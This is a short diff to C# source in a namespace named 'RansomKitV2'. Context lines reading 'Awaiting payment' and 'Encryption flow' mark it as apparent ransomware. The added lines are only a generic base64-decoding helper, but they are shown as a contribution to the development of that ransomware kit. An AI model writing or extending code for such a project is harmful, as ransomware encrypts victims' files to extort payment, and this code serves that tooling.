@@ -416,6 +416,22 @@ namespace RansomKitV2
             SetStatus("Awaiting payment", _ACC);
         }
 
+        static byte[]? SafeFromBase64(string? input)
+        {
+            if (string.IsNullOrWhiteSpace(input)) return null;
+
+            // strip all whitespace — handles newlines, spaces, wrapped strings
+            string clean = System.Text.RegularExpressions.Regex.Replace(input, @"\s+", "");
+
+            // base64 length must be multiple of 4 after cleanup
+            int padding = (4 - clean.Length % 4) % 4;
+            clean = clean + new string('=', padding);
+
+            try { return Convert.FromBase64String(clean); }
+            catch { return null; }
+        }
+
+
         // ══════════════════════════════════════════════════════════════
         // Encryption flow
         // ══════════════════════════════════════════════════════════════
